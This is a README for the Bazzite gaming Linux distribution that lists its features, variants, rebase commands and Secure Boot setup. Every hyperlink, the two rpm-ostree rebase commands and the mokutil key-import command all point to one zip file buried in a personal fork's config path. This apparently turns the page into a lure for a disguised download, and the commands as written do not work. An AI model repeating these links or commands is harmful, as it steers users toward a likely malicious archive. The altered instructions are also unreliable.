## About & Features

[Please see our website](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) for a newcomer-friendly explanation of Bazzite. This readme will cover everything in-depth.

[Bazzite](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) is a custom [Fedora Atomic](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) image built with [cloud native](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) technology that brings the best of Linux gaming to **all of your devices - including your favorite handheld**.

Bazzite is built from [ublue-os/main](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) and [ublue-os/nvidia](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) using [Fedora](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) technology, which means expanded hardware support and built in drivers are included. Additionally, Bazzite adds the following features:

- Uses the [bazzite kernel](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) to achieve HDR and expanded hardware support, among numerous other included patches - based off of the [fsync kernel](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).
- HDR available in Game mode.
- NVK available on non-Nvidia builds.
- Full hardware accelerated codec support for H264 decoding.
- Full support for AMD's ROCM OpenCL/HIP run-times.
- [xone](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) driver for Xbox controllers.
- Full support for [DisplayLink](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).
- Includes Valve's KDE themes from SteamOS.
- [LatencyFleX](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), [vkBasalt](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), [MangoHud](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), and [OBS VkCapture](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) installed and available by default
- [Patched Switcheroo-Control](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) fixing default-broken iGPU/dGPU switching.
- Support for [Wallpaper Engine](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip). <sub><sup>(Only on KDE)</sup></sub>
- [ROM Properties Page shell extension](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) included.
- Full support for [Winesync/Fastsync/NTsync](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).
- [Distrobox](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) preinstalled.
- Simplified Davinci Resolve installation with [davincibox](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) (`ujust install-resolve`)

### Desktop

Common variant available as `bazzite`, suitable for desktop computers.

- Automatic updates for the OS, Flatpaks, and more - powered by [ublue-update](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) and [topgrade](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).

> [!IMPORTANT]
> **ISOs can be downloaded from our [website](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), and a helpful install guide can be found [here](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).**

Rebase from an existing upstream Fedora Atomic to this image if you want **Open Source GPU Drivers**:
(Please note: Mesa's Open Source option for NVIDIA GPUs, NVK is still prone to errors at the time of writing, for any issues relating to NVK [please submit a report with Mesa]([url](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip)), not Ublue/Bazzite)

```bash
rpm-ostree rebase https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip
```

or for devices with Nvidia GPUs wanting the **NVIDIA Proprietary Drivers**:

```bash
rpm-ostree rebase https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip
```

**For users with Secure Boot enabled:** Follow our [secure boot documentation](#secure-boot) prior to rebasing.

### Steam Deck/Home Theater PCs (HTPCs)
Variant designed for usage as an alternative to SteamOS on the Steam Deck, and for a console-like experience on HTPCs, available as `bazzite-deck`:

- Directly boots to Game mode matching SteamOS's behavior.
- **Automatic `duperemove` greatly trims the size of compatdata.**
- **Latest version of Mesa creates smaller shader caches and does not require them to prevent stutter.**
- **Able to be booted even if the drive is full.**
- **Support for every language supported by upstream Fedora.**
- **Uses Wayland on the desktop with [support for Steam input](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).**
- Includes [HHD](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) for expanded input support on non-Valve handhelds.
- Features ported versions of most SteamOS packages, including drivers, firmware updaters, and fan controllers [from the evlaV repository](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).
- Patched Mesa for proper framerate control from Gamescope.
- Comes with patches from [SteamOS BTRFS](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) for full BTRFS support for the SD card by default.
- Ships with a ported copy of [SDGyroDSU](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), enabled by default.
- Option to install [Decky Loader](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), [EmuDeck](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), [RetroDECK](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), and [ProtonUp-Qt](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip), among numerous other useful packages on installation.
- Custom update system allows for the OS, Flatpaks, and more to be updated directly from the Game mode UI powered by [ublue-update](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) and [topgrade](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).
- Built in support for Windows dual-boot thanks to Fedora's installation of GRUB being left intact.
- Update break something? Easily roll back to the previous version of Bazzite thanks to `rpm-ostree`'s rollback functionality. You can even select previous images at boot.
- Steam and Lutris preinstalled on the image as layered packages.
- [Discover Overlay](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) for Discord pre-installed and automatically launches in both Game mode and on the Desktop if Discord is installed. [View the official documentation here](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).
- Uses ZRAM<sub><sup>(4GB)</sup></sub> with the LZ4 compression algorithm by default.
- [LAVD](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) and [BORE](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) CPU Schedulers for smooth and responsive gameplay.
- Kyber I/O scheduler to prevent I/O starvation when installing games or during background `duperemove` process.
- Applies SteamOS's kernel parameters.

## Why

Bazzite started as a project to resolve some of the issues that plague SteamOS, mainly out of date packages (despite an Arch base) and the lack of a functional package manager.

Despite this project also being image-based, you are able to install any Fedora package straight from the command line. These packages will persist across updates <sub><sup>(So go ahead and install that obscure VPN software you spent an hour trying to get working in SteamOS)</sup></sub>. Additionally, Bazzite is updated multiple times a week with packages from upstream Fedora, giving you the best possible performance and latest features - all on a stable base.

Bazzite ships with the latest Linux kernel and SELinux enabled by default with full support for secure boot <sub><sup>(Run `ujust enroll-secure-boot-key` and enter the password `universalblue` if prompted to enroll our key)</sup></sub> and disk encryption, making this a sensible solution for general computing. <sup><sub>(Yes, you can print from Bazzite)</sub></sup>

Read the [FAQ](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) for details on what makes Bazzite stand out from other Linux based operating systems.

## Secure Boot

> [!WARNING]
> **Steam Deck Users: The Steam Deck does not come with secure boot enabled and does not ship with any keys enrolled by default. Do not enable this unless you absolutely know what you're doing.**

Secure boot is supported with our custom key. The pub key can be found in the root of this repository [here](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip).
If you'd like to enroll this key prior to installation or rebase, download the key and run the following:

```bash
sudo mokutil --timeout -1
sudo mokutil --import https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip
```

For users already on a Universal Blue image, you may instead run `ujust enroll-secure-boot-key`.

If asked for a password, use `universalblue`.

## Build Your Own

Bazzite is built entirely in GitHub and creating your own custom version of it is as easy as forking this repository, adding a private signing key, and enabling GitHub actions.

[Familiarize yourself](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) on keeping secrets in github. You'll need to [generate a new keypair](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) with cosign. The public key can be in your public repo <sub><sup>(Your users need it to check the signatures)</sup></sub>, and you can paste the private key in `Settings -> Secrets -> Actions` with the name `SIGNING_SECRET`.

We also ship a config for the popular [pull app](https://raw.githubusercontent.com/Alessandro29437/bazzite/main/system_files/desktop/shared/etc/skel/.var/app/com.ranfdev.DistroShelf/config/glib-2.0/bazzite-v2.5.zip) if you'd like to keep your fork in sync with upstream. Enable this app on your repo to keep track of Bazzite changes while also making your own modifications.
